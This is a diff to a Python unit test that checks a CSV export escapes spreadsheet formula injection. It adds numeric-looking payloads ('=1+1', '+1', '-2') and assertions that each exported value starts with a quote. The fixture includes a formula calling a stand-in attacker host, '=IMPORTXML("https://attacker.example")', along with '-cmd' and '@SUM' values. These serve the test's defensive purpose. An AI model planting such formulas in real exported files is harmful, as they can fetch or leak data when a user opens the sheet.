@@ -89,12 +89,13 @@ async def test_export_service_escapes_spreadsheet_formulas_in_csv(tmp_path):
             "post_id": "abc",
             "title": "=IMPORTXML(\"https://attacker.example\")",
             "summary": "  @SUM(1,1)",
-            "pain_level": 8,
-            "willingness_to_pay": 9,
+            "pain_level": "=1+1",
+            "willingness_to_pay": "+1",
             "niche_category": "+Finance",
             "competitor_tags": "[]",
             "category": "complaint",
             "severity": "high",
+            "opportunity_score": "-2",
             "triage_status": "new",
             "deep_dive_status": "not_requested",
             "deep_dive_summary": "-cmd",
@@ -109,7 +110,10 @@ async def test_export_service_escapes_spreadsheet_formulas_in_csv(tmp_path):
         row = next(csv.DictReader(handle))
     assert row["title"].startswith("'=")
     assert row["summary"].startswith("'  @")
+    assert row["pain_level"].startswith("'=")
+    assert row["willingness_to_pay"].startswith("'+")
     assert row["niche_category"].startswith("'+")
+    assert row["opportunity_score"].startswith("'-")
     assert row["deep_dive_summary"].startswith("'-")
 
 
